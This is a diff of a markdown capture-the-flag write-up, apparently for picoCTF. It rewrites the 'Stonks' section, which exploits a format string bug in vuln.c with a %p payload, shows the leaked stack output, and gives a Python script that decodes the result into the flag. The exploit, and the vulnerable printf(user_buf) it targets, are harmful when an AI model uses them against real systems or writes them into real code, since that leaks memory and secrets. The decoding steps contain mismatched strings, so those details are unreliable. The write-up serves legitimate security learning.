@@ -152,13 +152,97 @@ The `gets()` is called and reads the user input onto the stack, where the stack 
 `picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}`
 
 ## 8. Stonks
-In this, the user has money from which a random share is picked after which the program asks the API token to the user. However, there exists a format string vulnerability as there are no quotes in the line 
-`print (user_buf)` and there is no %x to accept the string.
-On connecting to the server and choosing the connect to api token option, we can enter the api string as 
-`%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x`
-On doing this, we get a string in hexadecimal, which we convert to ASCII where we get a flag sort of looking file
+In this, the user has money from which a random share is picked after which the program asks the API token to the user.
+```On first entering the first option when the program starts, we can type gibberish when the program asks us:
+What is your API token?
+jkggkiliugliugluifyuftckj
+Buying stonks with token:
+jkggkiliugliugluifyuftckj
+Portfolio as of Mon Nov 13 09:24:44 UTC 2023
+
+
+1 shares of QHJ
+2 shares of FHR
+7 shares of YA
+1 shares of O
+13 shares of PCTQ
+5 shares of IIDQ
+269 shares of LHC
+185 shares of XP
+13 shares of JPSF
+66 shares of Y
+523 shares of AO
+629 shares of X
+Goodbye!
+```
+This just provides shares as per the user's input in a random order
+```
+What would you like to do?
+1) Buy some stonks!
+2) View my portfolio
+2
+
+Portfolio as of Mon Nov 13 09:24:57 UTC 2023
+
+
+You don't own any stonks!
+Goodbye!
+
+```
+This shows that no stonks are owned.
+On going through the source code `vuln.c`
+```
+char *user_buf = malloc(300 + 1);
+printf("What is your API token?\n");
+scanf("%300s", user_buf);
+printf("Buying stonks with token:\n");
+printf(user_buf);
+```
+In the given block of code, the input to printf is the data we can use to manipulate the code. 
+If we provide format strings in the user input we can exploit it towards our advantage.
+In the beginning of the buy_stonks function, the flag file is loaded and the code is copied to a buffer on the stack:
+```
+char api_buf[FLAG_BUFFER];
+FILE *f = fopen("api","r");
+if (!f) {
+    printf("Flag file not found. Contact an admin.\n");
+    exit(1);
+}
+fgets(api_buf, FLAG_BUFFER, f);
+```
+The `printf()` will pull information from the stack to match each format specifier. So if we overload it using `%p` format specifier which stands for a pointer address, we can exploit it.
+```
+What is your API token?
+%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
+Buying stonks with token:
+0x8ae83900x804b0000x80489c30xf7f67d800xffffffff0x10x8ae61600xf7f751100xf7f67dc7(nil)0x8ae71800x10x8ae83700x8ae83900x6f6369700x7b4654430x306c5f490x345f74350x6d5f6c6c0x306d5f790x5f79336e0x326663310x306131300xff8d007d
+
+```
+The underscores are used to separate the output so it becomes easier to read. 
+Also the 'nil' must be a padding operator, thus we conside only the hexadecimal digits after that.
+Upon inputting the hexademical code to a [hexadecimal editor](https://www.rapidtables.com/convert/number/hex-to-ascii.html), the value returned was 
+`çè7®ocip{FTC0l_I4_t5m_ll0m_y_y3n2fc10a10ÿ`
+and upon using this program:
+```
+string = "ocip{FTC0l_I4_t5m_ll0m_y_y3n4cdbae52ÿ½�}"
+out = ""
+temp = ""
+index = 0
+for char in string:
+    temp += char
+    index += 1
+    if index%4 == 0:
+        fwd = ""
+        for temp_char in temp:
+            fwd = temp_char + fwd
+        out += fwd
+        temp = ""
+print(out)
+```
+which reverses the strings every fourth letter, we got the flag. This was an example of little endian
 
 ### Flag
+picoCTF{I_l05t_4ll_my_m0n3y_1cf201a0}
 
 
 ## 9. GDB Baby Step 0
